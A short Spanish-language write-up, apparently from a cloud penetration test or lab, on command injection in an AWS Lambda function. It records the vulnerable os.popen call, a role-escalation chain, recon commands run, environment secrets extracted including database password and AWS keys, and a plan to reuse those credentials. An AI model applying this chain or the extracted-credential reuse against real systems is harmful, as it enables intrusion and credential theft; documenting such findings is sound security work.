# Fase 04 - Lambda Injection (RCE)

## Vulnerabilidad
Función: corp-data-processor
Código vulnerable: os.popen(event['command']).read()
Sin sanitización de input → RCE directo

## Acceso Obtenido
Via privesc: corp-ec2-instance-role → corp-lambda-execution-role → lambda:InvokeFunction

## Comandos Ejecutados
- id       → uid=993(sbx_user1051)
- whoami   → sbx_user1051
- ls /var/task → index.py
- cat /var/task/index.py → código fuente con vulnerabilidad documentada

## Secrets Extraídos del Environment
DB_HOST:     corp-database.us-east-1.rds.amazonaws.com
DB_PASSWORD: Sup3rS3cr3t!
API_KEY:     sk-prod-xxxxxxxxxxxxxxxxxxxx
AWS_ACCESS_KEY_ID: ASIAVDYITFDVNTR4DQ7S
AWS_SECRET_ACCESS_KEY: IRcmoEFhcZ7ieN3bO1IUKqIs7w3IzWPaXNKZZPDm

## Impacto
Ejecución de código arbitrario en Lambda + exposición total
de secrets en variables de entorno incluyendo credenciales AWS.

## Siguiente Fase
Usar credenciales del Lambda environment → Fase 07 Secrets Harvest
